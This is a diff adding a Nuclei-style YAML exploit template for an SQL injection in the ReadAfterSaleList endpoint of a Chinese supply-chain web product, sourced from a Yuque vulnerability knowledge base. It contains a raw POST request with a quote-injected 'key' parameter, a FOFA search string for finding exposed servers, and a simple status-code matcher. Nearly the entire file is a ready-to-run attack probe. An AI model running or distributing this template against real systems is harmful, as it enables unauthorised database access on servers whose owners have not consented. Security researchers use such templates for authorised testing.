@@ -1,0 +1,42 @@
+id: poc-tmt134vw36duteno
+info:
+  name: 懂微百择唯供应链 ReadAfterSaleList SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tmt134vw36duteno'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tmt134vw36duteno
+    fofa: body="/Content/Css/_SiteCss/"
+http:
+- raw:
+  - 'POST /AfterSale/ReadAfterSaleList HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 106
+
+    Accept: */*
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: 你的Cookie
+
+    Connection: keep-alive
+
+
+    time=%E8%BF%91%E4%B8%80%E5%91%A8%E8%AE%A2%E5%8D%95&state=%E5%B7%B2%E7%AD%BE%E6%94%B6&key=''&index=1&rows=10'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
